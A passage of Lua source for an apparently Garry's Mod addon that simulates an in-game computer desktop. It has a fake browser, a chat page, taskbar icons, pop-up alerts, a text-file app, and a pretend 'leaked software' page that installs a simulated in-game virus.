		Tittle:SetPos(450, 10)
		Tittle:SetFont("DermaLarge")
		Tittle:SetText( "You can find here all leaked soft" )
		Tittle:SizeToContents()

		local grid = vgui.Create( "DGrid", scr )
		grid:SetPos( 5, 100 )
		grid:SetCols( 5 )
		grid:SetColWide( 67 )
		grid:SetRowHeight( 67 )
		for k, v in pairs(OSS.Software) do
			sft = vgui.Create( "DImageButton" )
			sft:SetPos( 0, 0 )
			sft:SetSize( 64, 64 )
			sft:SetImage( v.i )
			sft:SetTooltip( k )
			sft.DoClick = function()
				for k1, v1 in pairs(main:GetChildren()) do
					if v1:GetName() == "DGrid" and v1.Desktop then
						OSS.AddSoftware(v1, OSS.Software[k], k, false)
						if math.random(1,3) <= 50 then
							OSS.InstallVirus((math.random(1,3)), main)
						end
					end
				end
			end
			grid:AddItem( sft )
		end
	end, false)

	OSS.Browser.AddPage("mylife.com", function(Parent, main, tbldat)
		local Page = vgui.Create( "DPanel", Parent )
		Page:Dock(FILL)
		Page.Paint = function(self, w, h)
			draw.RoundedBox( 0, 0, 0, w, h, Color(0,63,127,255) )
			draw.RoundedBox( 0, 0, 0, w, 50, Color(0,33,97,235) )
		end

		local scr = vgui.Create( "DScrollPanel", Page )
		scr:Dock( FILL )

		local Tittle = scr:Add( "DLabel" )
		Tittle:SetPos(150, 10)
		Tittle:SetFont("DermaLarge")
		Tittle:SetText( "MyLife: Chat" )
		Tittle:SizeToContents()

		local chatscr = vgui.Create( "DScrollPanel", scr )
		chatscr:SetPos(5, 50)
		chatscr:SetSize(1195, 200)

		local cht = chatscr:Add( "DLabel" )
		cht:SetPos( 5, 25 )
		cht:SetText(DrawText)
		cht:SetFont("DermaLarge")
		cht:SizeToContents()
		cht.Think = function()
			cht:SetText(DrawText)
			cht:SizeToContents()
		end

		local typer = scr:Add( "DTextEntry" )
		typer:SetPos(5, 255)
		typer:SetSize( 1165, 25 )
		typer:SetText( "Type message here" )
		typer:SetUpdateOnType( true )
		typer:SetKeyboardInputEnabled(main.UsedEntity:GetNWBool("OSS_HasKeyboard", false))
		typer.OnEnter = function( self )
			local drawnick = LocalPlayer():GetName()
			OSS_UpdateNetwork_MSG(drawnick, typer:GetValue())
			typer:SetText("")
		end
		function typer:OnValueChange()
			if not main.UsedEntity:GetNWBool("OSS_HasKeyboard", false) then return end
			LocalPlayer():EmitSound("ambient/machines/keyboard"..math.random(1,6).."_clicks.wav")
		end

	end, true)

	function OSS.Dangows.AddToBottom(parent, tbl, func, load)
		local gr = parent.BottomBar
		if table.Count(gr:GetItems()) < gr.Max then 
			local cell = vgui.Create( "DPanel" )
			cell:SetSize( 40, 40 )
			cell.Paint = function(self, w, h)
				self.AlfaChannel = self.AlfaChannel or 0
				self.ColorTBL = self.ColorTBL or {200,200,200}
				if self.Stressed then
					self.ColorTBL = {255,93,0}
					self.AlfaChannel = math.abs(math.cos(CurTime()*5)*255)
				else
					self.ColorTBL = {200,200,200}
				end
				draw.RoundedBox( 0, 0, 0, w, h, Color(self.ColorTBL[1],self.ColorTBL[2],self.ColorTBL[3],self.AlfaChannel) )

			end
			cell.OnCursorExited = function()
				cell.AlfaChannel = 0
			end

			local sft = vgui.Create( "DImageButton", cell )
			sft:SetPos( 0, 0 )
			sft:SetSize( 40, 40 )
			sft:SetImage( tbl.i )
			sft:SetTooltip( tbl.n or name )
			sft.OnCursorEntered = function()
				cell.AlfaChannel = 150
			end
			sft.OnCursorExited = function()
				cell.AlfaChannel = 0
				cell.Stressed = false
			end
			sft.GridP = cell

			gr:AddItem( cell )

			func(parent, sft, load)
			hook.Run("OD_OpenedSoftware", parent, tbl, func, load, sft)
			return
		end
	end
	function OSS.OpenSoftWare(tbl, parent, name)
		parent.SetupCustor = "hourglass"
		timer.Simple(parent.OverLoad/100, function()
			parent.SetupCustor = "arrow"
			OSS.Dangows.AddToBottom(parent, tbl, tbl.func, math.Round((tbl.RAM_Eat+tbl.Core_Eat)/(parent.UsedEntity.Core.speed/10 + parent.UsedEntity.RAM.RAM/10), 1))
			parent.OverLoad = parent.OverLoad+math.Round((tbl.RAM_Eat+tbl.Core_Eat)/(parent.UsedEntity.Core.speed/10 + parent.UsedEntity.RAM.RAM/10), 1)
			if parent.OverLoad/100 >= 1.5 then
				OSS.Dangows.Alert(parent, 0, "System overloads!\nClose some apps to make load less!")
			end
		end)
	end
	--[[-------------------------------------------------------------------------
	Throws alert(Notofiaction) in the right corner of Dangows OS
	args:
	1 = DFrame Desktop
	2 = Alert type: 0 - Warning, 1 - Success, 2 - Error
	3 = Message in allert
	4(optional) = Tittle of alert
	---------------------------------------------------------------------------]]
	function OSS.Dangows.Alert(parent, AlertType, AlertMessage, AlertTittle)
		local alert = vgui.Create( "DFrame", parent )
		alert:SetPos( 0, 0 )
		alert:SetSize( 400, 300 )
		alert:SetTitle(AlertTittle or (AlertType == 0 and "Warning!") or (AlertType == 1 and "Success!") or (AlertType == 2 and "Error!"))
		alert:SetVisible( true )
		alert:SetDraggable( false )
		alert:ShowCloseButton( true )
		alert:SetSizable(true)
		alert:SetScreenLock( true)
		alert:MakePopup()
		alert:MoveToFront()
		alert.Paint = function(self, w, h)
			draw.RoundedBox( 0, 0, 0, w, h, AlertColor or (AlertType == 0 and Color(255,187,0, 100)) or (AlertType == 1 and Color(0,255,0, 100)) or (AlertType == 2 and Color(255,0,0, 100)) )
		end
		OSS.AnimateDerma(alert, .5, function(pnl, anim, delta, data)
			pnl:SetPos(pnl:GetParent():GetWide()-395, inQuad( delta,-300, 300+pnl:GetParent():GetTall()-335 ))
		end)
		local text = vgui.Create("DLabel",alert)
		text:SetFont("Trebuchet24")
		text:SetText(AlertMessage)
		text:SetPos(5,25)
		text:SetColor(color_white)
		text:SizeToContents()

	end

	OSS.Files = {
		{n = "Text file", i = "icon16/page.png", Weight = 0, RAM_Eat = 0, Core_Eat = 0, func = function(main, key)
			local txt = vgui.Create( "DFrame", main )
			txt:SetPos( 100, 100 )
			txt:SetSize( 600, 500 )
			txt:SetTitle("Text file")
			txt:SetVisible( true )
			txt:SetDraggable( true )
			txt:ShowCloseButton( true )
			txt:SetSizable(true)
			txt:SetScreenLock( true)
			txt:MakePopup()
			txt.Paint = function(self, w, h)
				draw.RoundedBox( 0, 0, 0, w, h, Color(150,150,150,255) )
			end
			txt.btnMaxim:SetEnabled( true )
			txt.btnMinim:SetEnabled( true )
			txt.btnMaxim.DoClick = function()
				txt.btnMaxim.Maximum = txt.btnMaxim.Maximum or false
				if not txt.btnMaxim.Maximum then
					txt:SetPos( 5, 5 )
					txt:SetSize( ScrW()-10, ScrH()-50 )
					txt.btnMaxim.Maximum = true
				else
					txt:SetPos(100,100)
					txt:SetSize(600,500)
					txt.btnMaxim.Maximum = false
				end
			end
			txt.btnMinim.DoClick = function()
				txt:MoveToBack()
				txt:Hide()
			end

			function txt:OnKeyCodePressed( keyCode )
				if not main.UsedEntity:GetNWBool("OSS_HasKeyboard", false) then return end
				if (keyCode) == 64 then
					LocalPlayer():EmitSound("ambient/machines/keyboard7_clicks_enter.wav")
				else
					if (keyCode) != 107 and (keyCode) != 108 then
						LocalPlayer():EmitSound("ambient/machines/keyboard"..math.random(1,6).."_clicks.wav")
					end
				end
			end
			txt.RAM_Eat = 0
			txt.Core_Eat = 0
			table.insert(main.OpendApps, txt)
			txt.OnClose = function()
				table.RemoveByValue(main.OpendApps,txt)
				main.BottomBar:RemoveItem(key.GridP)
				key:Remove()
			end
			key.DoClick = function()
				txt:MoveToFront()	
				txt:Show()
			end

			local text = vgui.Create( "DTextEntry", txt )
			text:Dock(FILL)
			text:SetSize( 5, 25 )
			text:SetKeyboardInputEnabled(main.UsedEntity:GetNWBool("OSS_HasKeyboard", false))
			text:SetUpdateOnType( true )
			text:SetMultiline(true)
			text:SetText( "" )
			function text:OnValueChange()
				if not main.UsedEntity:GetNWBool("OSS_HasKeyboard", false) then return end
				LocalPlayer():EmitSound("ambient/machines/keyboard"..math.random(1,6).."_clicks.wav")
			end
		end},
	}

	function OSS.CreateFile(f, grid)
		local tbl = OSS.Files[f]		
		local prn = grid:GetParent()
		
		local cell = vgui.Create( "DPanel" )
		cell:SetSize( 40, 40 )
		cell.Paint = function(self, w, h)
			self.AlfaChannel = self.AlfaChannel or 0
			self.ColorTBL = self.ColorTBL or {150,150,150}
			draw.RoundedBox( 0, 0, 0, w, h, Color(self.ColorTBL[1],self.ColorTBL[2],self.ColorTBL[3],self.AlfaChannel) )
		end
		local sft = vgui.Create( "DImageButton", cell )
		sft:SetPos( 0, 0 )
		sft:SetSize( 40, 40 )
		sft:SetImage( tbl.i )
		sft:SetTooltip( tbl.n or name )
		sft.OnMousePressed = function(keyCode)
			sft:MouseCapture( true )
		end
		function sft:OnMouseReleased( keyCode )
			sft:MouseCapture( false )
			if keyCode != MOUSE_RIGHT then OSS.OpenSoftWare(tbl, prn, tbl.n or name) return end
			if tbl.n == "Browser" or tbl.n == "Computer" then return end
			local x,y = input.GetCursorPos()
			local Menu = DermaMenu(sft)
			Menu:AddOption( "Open", function() OSS.OpenSoftWare(tbl, prn, tbl.n or name) end ):SetIcon( "icon16/tick.png" )
			Menu:AddOption( "Remove", function()
				prn.Memory = prn.Memory - (tbl.Weight or 0)
				grid:RemoveItem(cell)

				net.Start("OSS_RemoveDangowsData")
					net.WriteString(tbl.n or name or "ERROR")
					net.WriteEntity(prn.UsedEntity)
					net.WriteTable({})
				net.SendToServer()
				OSS.Dangows.Alert(prn, 1, "Removed '"..(tbl.n or name or "ERROR").."'!")

			end):SetIcon( "icon16/cancel.png" )
			Menu:SetPos(x, y-Menu:ChildCount()*20)
			Menu:Open()
		end
		sft.OnCursorEntered = function()
			cell.AlfaChannel = 150
		end
		sft.OnCursorExited = function()
			cell.AlfaChannel = 0
		end
		
		grid:AddItem( cell )
	end
	function OSS.AddSoftware(grid, tbl, name, nosave, alr)
		local prn = grid:GetParent()
		if prn.Memory + (tbl.Weight or 0) > prn.MaxMemory then
			OSS.Dangows.Alert(prn, 0, "Not enough memory for\n"..(tbl.n or name or "ERROR").."!")
			return
		end
		local cell = vgui.Create( "DPanel" )
		cell:SetSize( 40, 40 )
		cell.Paint = function(self, w, h)
			self.AlfaChannel = self.AlfaChannel or 0
			self.ColorTBL = self.ColorTBL or {150,150,150}
			draw.RoundedBox( 0, 0, 0, w, h, Color(self.ColorTBL[1],self.ColorTBL[2],self.ColorTBL[3],self.AlfaChannel) )
		end

		local sft = vgui.Create( "DImageButton", cell )
		sft:SetPos( 0, 0 )
		sft:SetSize( 40, 40 )
		sft:SetImage( tbl.i )
		sft:SetTooltip( tbl.n or name )
		sft.OnMousePressed = function(keyCode)
			sft:MouseCapture( true )
		end
		function sft:OnMouseReleased( keyCode )
			sft:MouseCapture( false )
			if keyCode != MOUSE_RIGHT then OSS.OpenSoftWare(tbl, prn, tbl.n or name) return end
			if tbl.n == "Browser" or tbl.n == "Computer" then return end
			local x,y = input.GetCursorPos()
			local Menu = DermaMenu(sft)
			Menu:AddOption( "Open", function() OSS.OpenSoftWare(tbl, prn, tbl.n or name) end ):SetIcon( "icon16/tick.png" )
			Menu:AddOption( "Remove", function()
				prn.Memory = prn.Memory - (tbl.Weight or 0)
				grid:RemoveItem(cell)

				net.Start("OSS_RemoveDangowsData")
					net.WriteString(tbl.n or name or "ERROR")
					net.WriteEntity(prn.UsedEntity)
					net.WriteTable({})
				net.SendToServer()
				OSS.Dangows.Alert(prn, 1, "Removed '"..(tbl.n or name or "ERROR").."'!")

			end):SetIcon( "icon16/cancel.png" )
			Menu:SetPos(x, y-Menu:ChildCount()*20)
			Menu:Open()
		end
		sft.OnCursorEntered = function()
			cell.AlfaChannel = 150
		end
		sft.OnCursorExited = function()
			cell.AlfaChannel = 0
		end

		prn.Memory = prn.Memory + (tbl.Weight or 0)
		
		grid:AddItem( cell )
		if not nosave then
			net.Start("OSS_SaveDangowsData")
				net.WriteString(tbl.n or name or "ERROR")
				net.WriteEntity(prn.UsedEntity)
				net.WriteTable({})
			net.SendToServer()
			if not alr then
				OSS.Dangows.Alert(prn, 1, "Installed '"..(tbl.n or name or "ERROR").."'!")
			end
		end
	end
OSS.Print(0, "Runned CLIENT side successfuly")